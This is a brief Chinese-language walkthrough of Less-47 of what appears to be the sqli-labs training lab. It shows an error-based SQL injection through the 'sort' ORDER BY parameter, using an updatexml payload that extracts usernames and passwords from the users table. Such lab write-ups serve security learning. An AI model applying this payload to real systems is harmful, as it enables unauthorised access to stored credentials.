# Less-47

使用新的参数`sort`，通过输入`1，2，3`表中出现不同数据，该sql语句是`order by`，`sql`语句参数没有引号且不能使用联合注入，有报错显示，所以我们可以使用`updatexml`进行报错。而且多了一个单引号闭合，所以可以使用报错注入

![](./img/57d0471ff1e06ca723219b3f863098ef.png)



~~~ cmd
?sort=1‘ and (updatexml(1,concat(0x5c,(select group_concat(password,'-',username) from users),0x5c),1))
#其中0x5c指的是ASCII码中的\
~~~

![](./img/Less-47-01.PNG)
